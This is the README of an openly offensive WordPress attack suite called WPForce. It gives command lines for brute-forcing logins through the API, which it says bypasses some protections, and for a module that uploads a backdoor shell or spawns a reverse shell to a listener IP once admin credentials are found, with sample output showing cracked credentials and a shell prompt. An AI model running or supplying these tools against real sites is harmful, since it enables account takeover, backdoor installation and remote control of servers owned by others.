# WPForce - Wordpress Attack Suite
![alt tag](https://github.com/n00py/WPForce/blob/master/turtledoge.jpg)

## ABOUT:
WP Force is a suite of Wordpress Attack tools.  Currently this contains 2 modules - WPForce, which brute forces logins via the API, and Yertle, which uploads shells once admin credentials have been found.
## FEATURES:
* Brute Force via API, not login form bypassing some forms of protection
* Can automatically upload an interactive shell
* Can be used to spawn a full featured reverse shell


## INSTALL:
```
Yertle requires the requests libary to run.
http://docs.python-requests.org/en/master/user/install/
```

## USAGE:
```
python wpforce.py -i usr.txt -w pass.txt -u "http://www.[website].com"

   ,-~~-.___.       __        __ ____   _____
  / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
 (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
  \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/
     ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|
    /  \-'~;   ||     |
   /  __/~| ...||__/|-"   Brute Force Attack Tool for Wordpress
 =(  _____||________|                 ~n00py~

Username List: usr.txt (3)
Password List: pass.txt (21)
URL: http://www[website].com
--------------------------
[xxxxxxxxxxxxx@gmail.com : xxxxxxxxxxxxx] are valid credentials!  - THIS ACCOUNT IS ADMIN
--------------------------
--------------------------
[xxxxxxxxxxxxx@icloud.com : xxxxxxxxxxxx] are valid credentials!
--------------------------
 100% Percent Complete
All correct pairs:
{'xxxxxxxxxxxxx@icloud.com': 'xxxxxxxxxxxxx', 'xxxxxxxxxxxxx@gmail.com': 'xxxxxxxxxxxxx'}

 -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        Input file name
  -w WORDLIST, --wordlist WORDLIST
                        Wordlist file name
  -u URL, --url URL     URL of target
  -v, --verbose         Verbose output. Show the attemps as they happen.
  -t THREADS, --threads THREADS
                        Determines the number of threads to be used, default
                        is 10
  -a AGENT, --agent AGENT
                        Determines the user-agent
  -d, --debug           This option is used for determining issues with the
                        script.


python yertle.py -u "[username]" -p "[password]" -t "http://www.[website].com" -i
     _..---.--.    __   __        _   _
   .'\ __|/O.__)   \ \ / /__ _ __| |_| | ___
  /__.' _/ .-'_\    \ V / _ \ '__| __| |/ _ \.
 (____.'.-_\____)    | |  __/ |  | |_| |  __/
  (_/ _)__(_ \_)\_   |_|\___|_|   \__|_|\___|
   (_..)--(.._)'--'         ~n00py~
      Post-exploitation Module for Wordpress

Backdoor uploaded!
Upload Directory: ebwhbas
os-shell>



  -h, --help            show this help message and exit
  -i, --interactive     Interactive command shell
  -r, --reverse         Reverse Shell
  -t TARGET, --target TARGET
                        URL of target
  -u USERNAME, --username USERNAME
                        Admin username
  -p PASSWORD, --password PASSWORD
                        Admin password
  -li IP, --ip IP       Listener IP
  -lp PORT, --port PORT
                        Listener Port
  -v, --verbose         Verbose output.
  -e EXISTING, --existing EXISTING
                        Skips uploading a shell, and connects to existing
                        shell


```
